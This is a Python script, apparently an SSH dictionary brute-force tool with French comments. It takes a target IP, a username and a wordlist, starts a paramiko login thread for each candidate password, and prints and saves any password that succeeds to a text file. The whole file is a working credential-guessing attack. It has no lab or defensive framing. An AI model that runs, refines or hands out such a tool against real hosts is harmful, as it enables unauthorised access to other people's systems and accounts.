import paramiko
import threading
import argparse
from progressbar import *


def compteur(fichier):
    file = open(fichier, "r")
    line_count = 0
    for line in file:
        if line != "\n":
            line_count += 1
    file.close()
    return line_count


def sshconnect(number, host, user, password):
    global MaListe
    global count
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=user, password=password)
        print("password = " + password)
        myFile = open("passwordSSH.txt", "w+")
        myFile.write(password)
        myFile.close()
    except paramiko.ssh_exception.AuthenticationException:
        pass
        # os.system('clear')
        # print(str(round(number, 1)) + "%")

    except paramiko.ssh_exception.SSHException:
        print("overflow")

    if round(number, 0) not in MaListe:
        MaListe.append(round(number, 0))
    #print(MaListe)
    #print(count)
    client.close()

count = 0
MaListe = []

parser = argparse.ArgumentParser()
parser.add_argument("host", help="cible de l'attaque (ip)")
parser.add_argument("user", help="utilisateur auquel se connecter")
parser.add_argument("dictionnaire", help="dictionnaire d'attaque")
args = parser.parse_args()

line_count = compteur(args.dictionnaire)
widgets = ['Test: ', Percentage(), ' ', Bar(marker='#', left='[', right=']'),
               ' ']  # see docs for other options

pbar = ProgressBar(widgets=widgets, maxval=100)
pbar.start()

file = open(args.dictionnaire, "r")
for number, line in enumerate(file.readlines()):
    pourcentage: float = number / line_count * 100
    x = threading.Thread(target=sshconnect, args=(pourcentage, args.host, args.user, line.strip()))
    x.start()
    time.sleep(0.3)
    #print(len(MaListe))
    #print(count)
    pbar.update()
    if len(MaListe) > count:
        try:
            pbar.update(len(MaListe))
        except ValueError:
            pass
        count =+ 1

file.close()
pbar.finish()
